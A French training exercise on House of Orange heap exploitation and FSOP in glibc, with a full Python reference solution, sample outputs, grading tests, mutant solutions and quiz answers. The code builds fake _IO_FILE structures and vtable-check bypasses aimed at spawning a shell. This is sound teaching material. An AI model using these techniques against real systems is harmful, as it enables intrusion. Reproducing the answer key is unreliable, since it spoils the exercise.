# Exercice 3.4.7-d : house_orange

**Module :**
3.4.7 — Heap Exploitation

**Concept :**
d — House of Orange et File Stream Oriented Programming (FSOP)

**Difficulte :**
★★★★★★★★★★ (10/10)

**Type :**
code

**Tiers :**
3 — Synthese partielle

**Langage :**
Python 3.12

**Prerequis :**
- Exercices 3.4.7-a, b, c
- Comprehension des structures _IO_FILE
- Unsorted bin et large bin attacks
- Vtable hijacking concepts

**Domaines :**
Heap, FSOP, Exploit

**Duree estimee :**
180 min

**XP Base :**
500

**Complexite :**
T4 O(n log n) x S4 O(n^2)

---

## SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier a rendre :**
`house_orange.py`

**Fonctions autorisees :**
- `json` (module standard)
- `struct` (parsing binaire)
- `sys` (arguments)
- Fonctions built-in Python

**Fonctions interdites :**
- pwntools
- Librairies d'exploitation automatique

### 1.2 Consigne

#### 2.4.1 Contexte Culturel — "Mr. Robot"

*"Give a man a gun and he can rob a bank. Give a man a bank and he can rob the world."*

Dans **Mr. Robot**, Elliot exploite les systemes les plus securises en trouvant des angles d'attaque inattendus. House of Orange est exactement cela : une technique qui obtient un shell sans jamais appeler free(), en abusant du mecanisme interne de gestion des flux de sortie.

Comme Elliot qui utilise l'infrastructure bancaire contre elle-meme, tu vas utiliser les structures _IO_FILE de glibc comme arme pour prendre le controle.

#### 2.4.2 Enonce Academique

**House of Orange** est une technique avancee qui permet d'obtenir un shell meme sans acces a free(). Elle combine :
1. **Corruption du top chunk** pour declencher sysmalloc
2. **Unsorted bin attack** pour corrompre _IO_list_all
3. **FSOP (File Stream Oriented Programming)** pour hijacker le flux de controle

**Ta mission :**

Ecrire un programme `house_orange.py` qui :

1. **Genere** un fake _IO_FILE structure
2. **Calcule** les offsets pour l'unsorted bin attack
3. **Prepare** la vtable malveillante (ou _IO_str_jumps bypass)
4. **Simule** la chaine d'exploitation complete
5. **Adapte** aux differentes versions glibc (vtable checks)

**Structure _IO_FILE simplifiee :**
```c
struct _IO_FILE {
    int _flags;                    // +0x00
    char *_IO_read_ptr;            // +0x08
    char *_IO_read_end;            // +0x10
    char *_IO_read_base;           // +0x18
    char *_IO_write_base;          // +0x20
    char *_IO_write_ptr;           // +0x28
    char *_IO_write_end;           // +0x30
    char *_IO_buf_base;            // +0x38
    char *_IO_buf_end;             // +0x40
    // ... more fields ...
    struct _IO_FILE *_chain;       // +0x68
    // ... more fields ...
    const struct _IO_jump_t *vtable; // +0xd8
};
```

**Entree :**
- Fichier JSON contenant :
  - `glibc_version` : Version cible
  - `heap_base` : Base du heap
  - `libc_base` : Base de la libc
  - `target_function` : Fonction a appeler (system, one_gadget)
  - `command` : Commande a executer ("/bin/sh")
  - `primitive` : Type de vulnerabilite ("heap_overflow")

**Sortie :**
- JSON avec fake _IO_FILE, operations, et payload

**Exemples :**

| Entree | Sortie |
|--------|--------|
| `{"glibc_version": "2.23", "heap_base": "0x602000", "libc_base": "0x7f000", "target_function": "0x7f456"}` | `{"fake_io_file": {...}, "operations": [...]}` |

### 1.3 Prototype

```python
#!/usr/bin/env python3
"""
house_orange.py - House of Orange et FSOP exploitation
"""

import json
import struct
import sys

# _IO_FILE offsets (64-bit)
IO_FILE_OFFSETS = {
    '_flags': 0x00,
    '_IO_read_ptr': 0x08,
    '_IO_read_end': 0x10,
    '_IO_read_base': 0x18,
    '_IO_write_base': 0x20,
    '_IO_write_ptr': 0x28,
    '_IO_write_end': 0x30,
    '_IO_buf_base': 0x38,
    '_IO_buf_end': 0x40,
    '_chain': 0x68,
    '_fileno': 0x70,
    '_mode': 0xc0,
    'vtable': 0xd8,
}

IO_FILE_SIZE = 0xe0  # Size of _IO_FILE_plus

def build_fake_io_file(target_func: int, command_addr: int,
                       glibc_version: str) -> bytes:
    """
    Construit une fausse structure _IO_FILE pour FSOP.

    Args:
        target_func: Adresse de la fonction a appeler (system)
        command_addr: Adresse de la commande ("/bin/sh")
        glibc_version: Version de glibc

    Returns:
        bytes de la fake _IO_FILE structure
    """
    pass

def calculate_unsorted_bin_attack(heap_addr: int, libc_base: int,
                                   io_list_all_offset: int) -> dict:
    """
    Calcule les valeurs pour l'unsorted bin attack.

    Args:
        heap_addr: Adresse du chunk dans unsorted bin
        libc_base: Base de la libc
        io_list_all_offset: Offset de _IO_list_all dans libc

    Returns:
        Dictionnaire avec les valeurs bk et resultats
    """
    pass

def get_vtable_bypass_strategy(glibc_version: str) -> dict:
    """
    Determine la strategie de bypass vtable selon la version.

    glibc < 2.24: Vtable directe (pas de check)
    glibc 2.24-2.27: _IO_str_jumps bypass
    glibc 2.28+: Plus difficile, need other techniques

    Returns:
        Strategie et offsets necessaires
    """
    pass

def generate_house_orange_exploit(data: dict) -> dict:
    """
    Genere l'exploit House of Orange complet.

    Returns:
        Dictionnaire avec toutes les etapes et payloads
    """
    pass

def main():
    """Point d'entree principal."""
    pass

if __name__ == "__main__":
    main()
```

---

## SECTION 2 : LE SAVIEZ-VOUS ?

### L'origine de House of Orange

House of Orange a ete presentee par 4ngelboy (Angelboy) a HITCON CTF 2016. Le nom vient probablement du challenge CTF original. C'est une technique elegante car elle n'utilise pas free().

### FSOP (File Stream Oriented Programming)

FSOP exploite le fait que glibc maintient une liste chainee de tous les fichiers ouverts (_IO_list_all). Quand le programme termine (via exit() ou return de main), _IO_flush_all_lockp() parcourt cette liste et appelle les fonctions de flush via la vtable.

### Evolution des protections vtable

| Version | Protection |
|---------|-----------|
| < 2.24 | Aucune vtable check |
| 2.24 | IO_validate_vtable() introduit |
| 2.24-2.27 | Bypass via _IO_str_jumps (dans la range) |
| 2.28+ | _IO_str_jumps aussi protege |

---

## SECTION 2.5 : DANS LA VRAIE VIE

**Metier : Exploit Developer Senior**

House of Orange et FSOP sont utilises dans :
- **Exploitation avancee** : Quand free() n'est pas disponible
- **Sandbox escapes** : Environnements restreints
- **Competitions CTF** : Challenges heap de haut niveau

**Cas concret :**
Un chercheur exploite une vulnerabilite dans un programme qui n'a que malloc() et des operations de fichier :
1. Heap overflow pour corrompre le top chunk
2. Force sysmalloc pour mettre un chunk dans unsorted bin
3. Unsorted bin attack sur _IO_list_all
4. FSOP pour executer system("/bin/sh")

---

## SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ cat orange_config.json
{
  "glibc_version": "2.23",
  "heap_base": "0x555555559000",
  "libc_base": "0x7ffff7a0d000",
  "target_function": "0x7ffff7a52390",
  "command": "/bin/sh",
  "primitive": "heap_overflow"
}

$ python3 house_orange.py orange_config.json
{
  "technique": "house_of_orange",
  "glibc_version": "2.23",
  "vtable_check": false,
  "strategy": "direct_vtable",

  "phase1_top_chunk_corruption": {
    "description": "Corrupt top chunk to trigger sysmalloc",
    "operations": [
      {"action": "overflow", "target": "top_chunk.size",
       "value": "0xc01", "note": "Set size < allocation, page-aligned"},
      {"action": "malloc", "size": "0x1000",
       "note": "Triggers sysmalloc, old top -> unsorted bin"}
    ],
    "constraints": [
      "Size must have PREV_INUSE set",
      "Size + heap_addr must be page-aligned",
      "Size must be > MINSIZE (0x20)"
    ]
  },

  "phase2_unsorted_bin_attack": {
    "description": "Overwrite _IO_list_all via unsorted bin",
    "calculations": {
      "io_list_all": "0x7ffff7dd2520",
      "unsorted_bin_bk_value": "0x7ffff7dd2510",
      "effect": "_IO_list_all will point to unsorted bin - 0x10"
    },
    "operations": [
      {"action": "edit_chunk", "target": "freed_top.bk",
       "value": "0x7ffff7dd2510",
       "note": "Point bk to _IO_list_all - 0x10"},
      {"action": "malloc", "size": "0x100",
       "note": "Triggers unsorted bin unlinking, writes to _IO_list_all"}
    ]
  },

  "phase3_fake_io_file": {
    "description": "Craft fake _IO_FILE for FSOP",
    "fake_file_addr": "0x555555559010",
    "structure": {
      "_flags": "0x0068732f6e69622f",
      "_IO_read_ptr": "0x61",
      "_IO_write_base": "0x0",
      "_IO_write_ptr": "0x1",
      "_mode": "0x0",
      "_chain": "0x0",
      "vtable": "0x555555559100"
    },
    "fake_vtable": {
      "address": "0x555555559100",
      "__overflow": "0x7ffff7a52390"
    },
    "payload_hex": "2f62696e2f736800..."
  },

  "phase4_trigger": {
    "description": "Trigger _IO_flush_all_lockp",
    "methods": [
      "exit()",
      "return from main()",
      "abort() via assert/heap corruption"
    ],
    "execution_flow": [
      "_IO_flush_all_lockp()",
      "-> iterate _IO_list_all",
      "-> find our fake _IO_FILE",
      "-> call vtable->__overflow(file, EOF)",
      "-> system('/bin/sh')"
    ]
  },

  "complete_payload": {
    "top_chunk_size": "0x0000000000000c01",
    "fake_io_file_hex": "2f62696e2f736800...",
    "total_allocations": 3
  },

  "notes": [
    "glibc 2.23 has no vtable protection",
    "Fake file must pass _IO_OVERFLOW conditions",
    "_flags must have specific bits set/cleared"
  ]
}

$ cat orange_224.json
{
  "glibc_version": "2.24",
  "heap_base": "0x555555559000",
  "libc_base": "0x7ffff7a0d000"
}

$ python3 house_orange.py orange_224.json
{
  "technique": "house_of_orange",
  "glibc_version": "2.24",
  "vtable_check": true,
  "strategy": "_IO_str_jumps_bypass",

  "vtable_bypass": {
    "description": "Use _IO_str_jumps which is in valid vtable range",
    "_IO_str_jumps_offset": "0x3c37a0",
    "_IO_str_overflow_offset": "0x3c3800",
    "technique": "Set vtable to _IO_str_jumps - 8, __overflow becomes _IO_str_finish"
  },

  "phase3_fake_io_file": {
    "structure": {
      "vtable": "0x7ffff7dcc798",
      "_IO_buf_base": "0x7ffff7a52390",
      "_IO_buf_end": "0x7ffff7a52391",
      "_IO_write_ptr": "0x7ffff7a52392"
    },
    "explanation": "_IO_str_overflow will call *(_IO_buf_base)(file)"
  }
}
```

---

## SECTION 3.1 : BONUS STANDARD (OPTIONNEL)

**Difficulte Bonus :**
★★★★★★★★★★ (10/10)

**Recompense :**
XP x2.5

### 3.1.1 Consigne Bonus

**Extension "Modern FSOP Techniques" :**

1. **Large bin attack** comme alternative a unsorted bin
2. **_IO_wfile_jumps** exploitation pour glibc 2.28+
3. **House of Kiwi** integration (_IO_helper_jumps)
4. **Automatic gadget finding** pour vtable bypass

---

## SECTION 4 : ZONE CORRECTION

### 4.1 Moulinette

| Test | Entree | Sortie Attendue | Points |
|------|--------|-----------------|--------|
| basic_223 | glibc 2.23 | Direct vtable strategy | 15 |
| vtable_check_224 | glibc 2.24 | _IO_str_jumps bypass | 20 |
| fake_io_file | Standard config | Valid _IO_FILE structure | 15 |
| unsorted_calc | libc_base given | Correct _IO_list_all calc | 15 |
| top_chunk_size | heap_base given | Page-aligned size | 10 |
| flags_calc | target given | Correct _flags value | 10 |
| modern_bypass | glibc 2.28 | Warning + alternatives | 10 |
| full_chain | Complete config | All phases present | 5 |

### 4.2 Solution de reference

```python
#!/usr/bin/env python3
"""
house_orange.py - Solution de reference
"""

import json
import struct
import sys

# _IO_FILE offsets (64-bit glibc)
IO_FILE_OFFSETS = {
    '_flags': 0x00,
    '_IO_read_ptr': 0x08,
    '_IO_read_end': 0x10,
    '_IO_read_base': 0x18,
    '_IO_write_base': 0x20,
    '_IO_write_ptr': 0x28,
    '_IO_write_end': 0x30,
    '_IO_buf_base': 0x38,
    '_IO_buf_end': 0x40,
    '_IO_save_base': 0x48,
    '_IO_backup_base': 0x50,
    '_IO_save_end': 0x58,
    '_markers': 0x60,
    '_chain': 0x68,
    '_fileno': 0x70,
    '_flags2': 0x74,
    '_old_offset': 0x78,
    '_cur_column': 0x80,
    '_vtable_offset': 0x82,
    '_shortbuf': 0x83,
    '_lock': 0x88,
    '_offset': 0x90,
    '_codecvt': 0x98,
    '_wide_data': 0xa0,
    '_freeres_list': 0xa8,
    '_freeres_buf': 0xb0,
    '__pad5': 0xb8,
    '_mode': 0xc0,
    '_unused2': 0xc4,
    'vtable': 0xd8,
}

IO_FILE_SIZE = 0xe0

# Libc offsets (will vary by version, these are examples)
LIBC_OFFSETS = {
    '2.23': {
        '_IO_list_all': 0x3c5520,
        '_IO_str_jumps': 0x3c37a0,
        'system': 0x45390,
    },
    '2.27': {
        '_IO_list_all': 0x3ec680,
        '_IO_str_jumps': 0x3e8360,
        'system': 0x4f440,
    },
    '2.31': {
        '_IO_list_all': 0x1ec5a0,
        '_IO_str_jumps': 0x1e8f60,
        'system': 0x55410,
    }
}

def parse_hex(value) -> int:
    if isinstance(value, int):
        return value
    value = str(value).strip()
    if value.startswith('-'):
        return -int(value[1:], 16) if '0x' in value.lower() else -int(value)
    if value.lower().startswith('0x'):
        return int(value, 16)
    return int(value, 16)

def parse_version(version_str: str) -> tuple:
    parts = version_str.split('.')
    return (int(parts[0]), int(parts[1]))

def has_vtable_check(version: str) -> bool:
    """Check if glibc version has vtable validation."""
    return parse_version(version) >= (2, 24)

def get_vtable_bypass_strategy(glibc_version: str) -> dict:
    """Determine vtable bypass strategy."""
    version = parse_version(glibc_version)

    if version < (2, 24):
        return {
            'strategy': 'direct_vtable',
            'description': 'No vtable check, can use arbitrary vtable address',
            'difficulty': 'easy'
        }
    elif version < (2, 28):
        return {
            'strategy': '_IO_str_jumps_bypass',
            'description': 'Use _IO_str_jumps which is in valid vtable range',
            'technique': 'Point vtable to _IO_str_jumps, abuse _IO_str_overflow',
            'difficulty': 'medium'
        }
    else:
        return {
            'strategy': 'alternative_needed',
            'description': '_IO_str_jumps also protected in glibc 2.28+',
            'alternatives': [
                'House of Kiwi (_IO_helper_jumps)',
                '_IO_wfile_jumps exploitation',
                'Large bin attack + other techniques'
            ],
            'difficulty': 'hard'
        }

def calculate_top_chunk_size(heap_addr: int) -> int:
    """
    Calculate valid top chunk size for House of Orange.

    Requirements:
    - PREV_INUSE must be set
    - heap_addr + size must be page-aligned
    - size > MINSIZE and < current top size
    """
    # We want heap_addr + size to end on page boundary
    page_size = 0x1000
    current_page_offset = heap_addr % page_size

    # Size that makes it page-aligned, with PREV_INUSE
    size = page_size - current_page_offset
    if size < 0x20:  # MINSIZE
        size += page_size

    # Set PREV_INUSE flag
    size |= 1

    return size

def build_fake_io_file(target_func: int, command_addr: int,
                       glibc_version: str, vtable_addr: int = 0) -> dict:
    """Build fake _IO_FILE structure."""

    # Initialize with zeros
    file_data = bytearray(IO_FILE_SIZE)

    # _flags: needs specific bits for _IO_OVERFLOW to be called
    # We want: (_flags & _IO_NO_WRITES) == 0
    # And: _IO_write_ptr > _IO_write_base
    # Trick: put "/bin/sh" string in _flags
    flags = 0x0068732f6e69622f  # "/bin/sh\x00" as little-endian
    struct.pack_into('<Q', file_data, IO_FILE_OFFSETS['_flags'], flags)

    # Set _IO_read_ptr to bypass some checks (non-null)
    struct.pack_into('<Q', file_data, IO_FILE_OFFSETS['_IO_read_ptr'], 0x61)

    # _IO_write_base and _IO_write_ptr setup
    # Need: _IO_write_ptr > _IO_write_base
    struct.pack_into('<Q', file_data, IO_FILE_OFFSETS['_IO_write_base'], 0)
    struct.pack_into('<Q', file_data, IO_FILE_OFFSETS['_IO_write_ptr'], 1)

    # _mode should be 0 (or <= 0)
    struct.pack_into('<i', file_data, IO_FILE_OFFSETS['_mode'], 0)

    # vtable pointer
    struct.pack_into('<Q', file_data, IO_FILE_OFFSETS['vtable'], vtable_addr)

    # For _IO_str_jumps bypass, we also need:
    if has_vtable_check(glibc_version):
        # _IO_buf_base will be used as function pointer
        struct.pack_into('<Q', file_data, IO_FILE_OFFSETS['_IO_buf_base'], target_func)
        # _IO_buf_end > _IO_buf_base
        struct.pack_into('<Q', file_data, IO_FILE_OFFSETS['_IO_buf_end'], target_func + 1)

    return {
        'data': file_data.hex(),
        'size': IO_FILE_SIZE,
        'fields': {
            '_flags': hex(flags),
            '_IO_read_ptr': '0x61',
            '_IO_write_base': '0x0',
            '_IO_write_ptr': '0x1',
            '_mode': '0',
            'vtable': hex(vtable_addr)
        }
    }

def calculate_unsorted_bin_attack(heap_addr: int, libc_base: int,
                                   glibc_version: str) -> dict:
    """Calculate unsorted bin attack parameters."""

    offsets = LIBC_OFFSETS.get(glibc_version, LIBC_OFFSETS['2.31'])
    io_list_all = libc_base + offsets['_IO_list_all']

    # Unsorted bin attack: write unsorted_bin address to bk->fd
    # We set chunk.bk = _IO_list_all - 0x10
    # When malloc takes from unsorted bin: victim->bk->fd = unsorted_bin
    # This writes &unsorted_bin to _IO_list_all

    bk_value = io_list_all - 0x10

    return {
        '_IO_list_all': hex(io_list_all),
        'bk_value': hex(bk_value),
        'effect': f'_IO_list_all will be overwritten with unsorted_bin address',
        'chain_result': f'First _IO_FILE in chain will be at unsorted_bin - 0x10'
    }

def build_fake_vtable(target_func: int, glibc_version: str) -> dict:
    """Build fake vtable structure."""

    if not has_vtable_check(glibc_version):
        # Simple case: just need __overflow at offset 0x18
        vtable = bytearray(0x100)
        struct.pack_into('<Q', vtable, 0x18, target_func)  # __overflow

        return {
            'type': 'custom_vtable',
            'data': vtable.hex(),
            '__overflow_offset': 0x18,
            '__overflow_value': hex(target_func)
        }
    else:
        # Need to use _IO_str_jumps bypass
        return {
            'type': '_IO_str_jumps_based',
            'description': 'Vtable points to _IO_str_jumps with offset',
            'note': 'Function pointer comes from _IO_buf_base instead'
        }

def generate_house_orange_exploit(data: dict) -> dict:
    """Generate complete House of Orange exploit."""

    glibc_version = data.get('glibc_version', '2.31')
    heap_base = parse_hex(data.get('heap_base', 0))
    libc_base = parse_hex(data.get('libc_base', 0))
    target_func = parse_hex(data.get('target_function', 0))
    command = data.get('command', '/bin/sh')

    result = {
        'technique': 'house_of_orange',
        'glibc_version': glibc_version,
        'vtable_check': has_vtable_check(glibc_version),
        'strategy': get_vtable_bypass_strategy(glibc_version)
    }

    # Phase 1: Top chunk corruption
    top_chunk_addr = heap_base + 0x20  # Assume after initial allocation
    corrupted_size = calculate_top_chunk_size(top_chunk_addr)

    result['phase1_top_chunk_corruption'] = {
        'description': 'Corrupt top chunk size to trigger sysmalloc',
        'top_chunk_addr': hex(top_chunk_addr),
        'corrupted_size': hex(corrupted_size),
        'operations': [
            {'action': 'overflow', 'target': 'top_chunk.size',
             'value': hex(corrupted_size),
             'note': 'Size must be page-aligned with PREV_INUSE'},
            {'action': 'malloc', 'size': hex(corrupted_size + 0x1000),
             'note': 'Request larger than top, triggers sysmalloc'}
        ],
        'result': 'Old top chunk placed in unsorted bin'
    }

    # Phase 2: Unsorted bin attack
    unsorted_attack = calculate_unsorted_bin_attack(heap_base, libc_base, glibc_version)

    result['phase2_unsorted_bin_attack'] = {
        'description': 'Overwrite _IO_list_all via unsorted bin unlink',
        'calculations': unsorted_attack,
        'operations': [
            {'action': 'edit', 'target': 'old_top.bk',
             'value': unsorted_attack['bk_value'],
             'note': 'Set bk to _IO_list_all - 0x10'},
            {'action': 'malloc', 'size': '0x100',
             'note': 'Triggers unsorted bin scan, writes to _IO_list_all'}
        ]
    }

    # Phase 3: Fake _IO_FILE
    # Calculate vtable address based on strategy
    if not has_vtable_check(glibc_version):
        vtable_addr = heap_base + 0x200  # Place vtable on heap
    else:
        offsets = LIBC_OFFSETS.get(glibc_version, LIBC_OFFSETS['2.31'])
        vtable_addr = libc_base + offsets['_IO_str_jumps']

    fake_file = build_fake_io_file(target_func, heap_base, glibc_version, vtable_addr)
    fake_vtable = build_fake_vtable(target_func, glibc_version)

    result['phase3_fake_io_file'] = {
        'description': 'Craft fake _IO_FILE structure',
        'location': 'In old top chunk (now in unsorted bin)',
        'structure': fake_file,
        'vtable': fake_vtable
    }

    # Phase 4: Trigger
    result['phase4_trigger'] = {
        'description': 'Trigger _IO_flush_all_lockp',
        'methods': [
            {'method': 'exit()', 'note': 'Cleanest method'},
            {'method': 'return from main()', 'note': 'Same as exit()'},
            {'method': 'malloc abort', 'note': 'Corrupt heap more to trigger assert'}
        ],
        'execution_flow': [
            '_IO_flush_all_lockp() called',
            'Iterates _IO_list_all chain',
            'Reaches our fake _IO_FILE',
            'Calls fp->vtable->__overflow(fp, EOF)',
            f'Executes {hex(target_func)}("/bin/sh")'
        ]
    }

    # Warnings
    result['warnings'] = []
    if has_vtable_check(glibc_version):
        result['warnings'].append(f'glibc {glibc_version} has vtable validation')
    if parse_version(glibc_version) >= (2, 28):
        result['warnings'].append('glibc 2.28+ blocks _IO_str_jumps, need alternative')

    return result

def main():
    if len(sys.argv) < 2:
        print("Usage: house_orange.py <config.json | ->", file=sys.stderr)
        sys.exit(1)

    input_file = sys.argv[1]

    if input_file == '-':
        data = json.load(sys.stdin)
    else:
        with open(input_file, 'r') as f:
            data = json.load(f)

    result = generate_house_orange_exploit(data)
    print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()
```

### 4.3 Solutions Mutantes

```python
# Mutant A: Mauvais offset vtable
IO_FILE_OFFSETS_MUTANT = {'vtable': 0xc8}  # Wrong! Should be 0xd8

# Mutant B: Oublie PREV_INUSE dans top chunk size
def calc_size_mutant(addr):
    return 0x1000 - (addr % 0x1000)  # Missing | 1!

# Mutant C: Mauvais calcul unsorted bin attack
def unsorted_mutant(io_list_all):
    return io_list_all  # Should be io_list_all - 0x10!

# Mutant D: Ignore vtable check
def get_strategy_mutant(version):
    return {'strategy': 'direct_vtable'}  # Wrong for 2.24+!

# Mutant E: Mauvais flags pour _IO_OVERFLOW
def build_file_mutant():
    flags = 0  # Won't trigger __overflow!
    return flags
```

---

## SECTION 5 : COMPRENDRE

### 5.1 Ce que cet exercice enseigne

1. **House of Orange** : Exploitation sans free()
2. **FSOP** : Abus des structures _IO_FILE
3. **Vtable hijacking** : Controle du flux via vtable
4. **Evolution glibc** : Adaptation aux protections

### 5.2 Visualisation ASCII

```
           HOUSE OF ORANGE - COMPLETE ATTACK
┌──────────────────────────────────────────────────────────────┐
│  PHASE 1: Top Chunk Corruption                               │
│  ─────────────────────────────                               │
│  Heap before:                    Heap after malloc(big):     │
│  ┌──────────────┐               ┌──────────────┐             │
│  │ chunk A      │               │ chunk A      │             │
│  ├──────────────┤               ├──────────────┤             │
│  │ TOP CHUNK    │               │ OLD TOP      │──► unsorted │
│  │ size=0x20fe1 │  overflow     │ size=0xc01   │     bin     │
│  │              │  ────────►    ├──────────────┤             │
│  │              │               │ NEW TOP      │             │
│  │              │               │ (from mmap)  │             │
│  └──────────────┘               └──────────────┘             │
│                                                              │
│  PHASE 2: Unsorted Bin Attack                                │
│  ────────────────────────────                                │
│  unsorted bin: old_top ◄─► main_arena                        │
│                                                              │
│  Set old_top.bk = _IO_list_all - 0x10                        │
│                                                              │
│  After malloc from unsorted:                                 │
│  victim->bk->fd = unsorted_bin_addr                          │
│  _IO_list_all = &unsorted_bin ✓                              │
│                                                              │
│  PHASE 3: Fake _IO_FILE                                      │
│  ─────────────────────────                                   │
│  old_top chunk now contains:                                 │
│  ┌──────────────────────────────────────────────────┐        │
│  │ _flags:       "/bin/sh\0"  (also command!)       │        │
│  │ _IO_read_ptr: 0x61                               │        │
│  │ _IO_write_base: 0                                │        │
│  │ _IO_write_ptr: 1          (> write_base)         │        │
│  │ ...                                              │        │
│  │ _chain:      NULL         (end of list)          │        │
│  │ _mode:       0                                   │        │
│  │ vtable:      heap or _IO_str_jumps               │        │
│  └──────────────────────────────────────────────────┘        │
│                                                              │
│  PHASE 4: Trigger                                            │
│  ───────────────                                             │
│  exit() / return from main()                                 │
│        │                                                     │
│        ▼                                                     │
│  _IO_flush_all_lockp()                                       │
│        │                                                     │
│        ▼                                                     │
│  for (fp = _IO_list_all; fp; fp = fp->_chain)                │
│        │                                                     │
│        ▼                                                     │
│  if (needs_flush(fp))                                        │
│    fp->vtable->__overflow(fp, EOF)                           │
│        │                                                     │
│        ▼                                                     │
│  system("/bin/sh")  ← SHELL!                                 │
└──────────────────────────────────────────────────────────────┘
```

---

## SECTION 6 : PIEGES - RECAPITULATIF

| # | Piege | Consequence | Solution |
|---|-------|-------------|----------|
| 1 | Top chunk size sans PREV_INUSE | free() check echoue | size \| 1 |
| 2 | Pas page-aligned | sysmalloc echoue | Calculer selon heap_addr |
| 3 | Mauvais bk pour unsorted | Ecrit au mauvais endroit | _IO_list_all - 0x10 |
| 4 | Vtable hors range (2.24+) | IO_validate_vtable() fail | Utiliser _IO_str_jumps |
| 5 | _flags incorrects | __overflow pas appele | Verifier toutes conditions |

---

## SECTION 7 : QCM

### Question 1
**Quel est l'avantage principal de House of Orange ?**

A) Plus rapide que les autres techniques
B) Fonctionne sans appeler free()
C) Bypass toutes les protections
D) Plus simple a implementer

**Reponse : B**

### Question 2
**Que fait l'unsorted bin attack dans House of Orange ?**

A) Libere un chunk
B) Alloue de la memoire
C) Ecrit l'adresse unsorted_bin dans _IO_list_all
D) Modifie le top chunk

**Reponse : C**

### Question 3
**A partir de quelle version glibc y a-t-il validation vtable ?**

A) 2.20
B) 2.23
C) 2.24
D) 2.29

**Reponse : C**

### Question 4
**Quelle fonction est appellee par _IO_flush_all_lockp ?**

A) read
B) write
C) __overflow via vtable
D) fclose

**Reponse : C**

### Question 5
**Comment bypass la vtable validation en glibc 2.24-2.27 ?**

A) Desactiver la protection
B) Utiliser _IO_str_jumps
C) Buffer overflow
D) Format string

**Reponse : B**

---

## SECTION 8 : RECAPITULATIF

| Element | Valeur |
|---------|--------|
| **Difficulte** | ★★★★★★★★★★ (10/10) |
| **Temps estime** | 180 min |
| **XP Base** | 500 |
| **Concepts** | FSOP, Unsorted bin, _IO_FILE, vtable |

---

## SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "exercise_id": "3.4.7-d",
    "exercise_name": "house_orange",
    "difficulty": 10,
    "xp_base": 500,
    "tags": ["heap", "fsop", "house-of-orange", "io-file", "vtable"]
  }
}
```
